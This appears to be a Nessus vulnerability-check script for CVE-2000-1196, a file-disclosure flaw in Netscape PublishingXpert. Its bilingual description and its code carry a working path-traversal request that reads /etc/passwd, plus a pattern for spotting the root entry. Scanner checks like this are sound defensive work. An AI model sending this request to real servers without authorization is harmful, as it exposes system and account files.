#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10364);
 script_version ("$Revision: 1.9 $");
 script_cve_id("CVE-2000-1196");
 name["english"] = "netscape publishingXpert 2 PSUser problem";
 name["francais"] = "netscape publishingXpert 2 PSUser problem";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The '/PSUser/PSCOErrPage.htm' CGI allows a 
malicious user to view any file on the target computer by issuing
a GET request :

GET  /PSUser/PSCOErrPage.htm?errPagePath=/file/to/read

Risk factor : Medium/High
Solution : Remove it";

 desc["francais"] = "Le CGI '/PSUser/PSCOErrPage.htm' permet à un 
pirate de lire n'importe quel fichier sur la machine cible
au travers de la commande :

GET  /PSUser/PSCOErrPage.htm?errPagePath=/file/to/read

Facteur de risque : Moyen/Elevé

Solution : Supprimez cette page";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks if /PSUser/PSCOErrPage.htm reads any file";
 summary["francais"] = "Détermine si /PSUser/PSCOErrPage.htm lit n'importe quel fichier";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl");
  script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;

if(get_port_state(port))
{
  req = http_get(item:"/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd",
  		 port:port);
  soc = http_open_socket(port);
  if(soc)
  {
   send(socket:soc, data:req);
   result = http_recv(socket:soc);
   if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_hole(port);
  }
}

